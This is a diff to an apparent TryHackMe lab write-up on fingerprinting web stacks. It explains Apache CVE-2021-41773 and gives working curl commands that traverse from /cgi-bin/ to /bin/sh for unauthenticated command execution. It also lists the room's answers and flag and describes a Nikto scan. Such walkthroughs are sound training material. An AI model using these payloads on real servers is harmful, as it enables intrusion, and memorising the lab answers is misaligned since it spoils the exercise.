@@ -177,7 +177,7 @@ Fingerprinting the LAMP Stack
 
 Start with header check using curl, Apache Advertisies in every response
 
-Run the command : curl -I http://Machine_IP:8000
+Run the command : curl -I http://Machine_IP:8080
 
 root@tryhackme:~# curl -I http://10.66.133.74:8080/
 HTTP/1.1 200 OK
@@ -207,6 +207,68 @@ Once Done, look for the header :
 **CVE-2021-41773: The Vulnerability**
 
 Apache 2.4.49 introduced a change to the ap_normalize_path() function. The change inadvertently broke the path traversal filter. Normally, Apache blocks any URL containing ../ before it reaches the filesystem. The bug is in the decode order: the traversal filter runs before full URL decoding.
+
+When you send .%2e/ (a literal dot followed by the URL-encoded dot and a slash), the filter sees .%2e/ and does not recognise it as ../. When Apache passes the URL to the filesystem, the OS resolves .%2e/ as ../. The filter was bypassed.
+
+On its own, this is directory traversal for file read. What makes it critical is the interaction with mod_cgi. The /cgi-bin/ path has CGI execution enabled. When the traversal resolves to an executable binary like /bin/sh, Apache runs it as a CGI script and passes the HTTP POST body to its stdin.
+
+**Why --path-as-is Is Required**
+
+curl normalises URLs before sending them. Without --path-as-is, curl cleans up .%2e/ sequences before the request leaves your machine, and the server receives a normal path. The flag tells curl to send the URL exactly as typed.
+
+
+Warning: If your traversal requests return 403 instead of executing, the most common cause is a missing --path-as-is flag. curl silently normalises the traversal sequences, and the server never sees the encoded dots.
+
+Exploitation 
+
+You have confirmed Apache 2.4.49 on port 8080, with mod_cgi enabled on /cgi-bin/. You have a direct path to unauthenticated RCE.
+
+--> Traverse from /cgi-bin/ up to /bin/sh using four .%2e/ segments. Pass shell commands in the POST Body. The echo Content-Type text/plain; echo; preamble is required by the CGI spec. Apache needs a valid HTTP Header block before the body or it returns a 5000. The bare echo outpurs the required blank seperator line:
+
+Run the command :
+
+curl -s --path-as-is "https://machineip:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; id'
+
+This gives: ![CVE-2021-41773_Vulnerability_Exploit](../../Images/CVE-2021-41773_Vulnerability_Exploit_1.png)
+
+Then run the command to get the flag
+
+curl -s --path-as-is "https://machineIP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
+
+This gives ![CVE-2021-41773_Vulnerability_Flag](../../Images/CVE-2021-41773_Vulnerability_Flag.png)
+
+**Questions**: 
+
+1. What exact Server header value identifies this target as vulnerable to CVE-2021-41773? (Answer Format: Apache/X.X.XX (OS) -->Apache/2.4.49 (Unix)
+2. What curl flag is required to prevent curl from normalising the traversal sequences in the URL before sending? --path-as-is
+3.What are the contents of the flag.txt file? --> THM{4p4ch3_p4th_tr4v3rs4l}
+
+**Automation:**
+
+Manual fingerprinting teaches you what signals matter and why. When you are working through a scope with many hosts, Nikto gives you a quick first pass; it probes each service, reads response headers, and surfaces stack signals and known misconfigurations without you writing a single payload.
+
+Scanning All Four Stacks
+
+Run Nikto against each port in turn: MERN on port 3000, Next.js on port 3001, Django on port 8000, and Apache on port 8080.
+
+![Nikto_MERN_results](../../Images/Nikto_MERN_results.png)
+
+No Server: banner; Express does not send one by default. Two signals confirm the stack: x-powered-by: Express and the connect.sid session cookie. The missing httponly flag on the session cookie is a bonus finding.
+
+Port 3001 - Next.js
+
+![Nikto_Next.js_results](../../Images/Nikto_Next.js_results.png)
+
+x-powered-by: Next.js confirms the framework. The three x-nextjs-* headers confirm that the App Router is in production mode, the condition required for CVE-2025-29927 to apply.
+
+Port 8000 - Django
+
+WSGIServer/0.2 CPython/3.10.12 is a Django-specific server banner. The combination of referrer-policy: same-origin and x-content-type-options: nosniff together confirm Django's SecurityMiddleware is active.
+
+
+
+
+
 
 
 
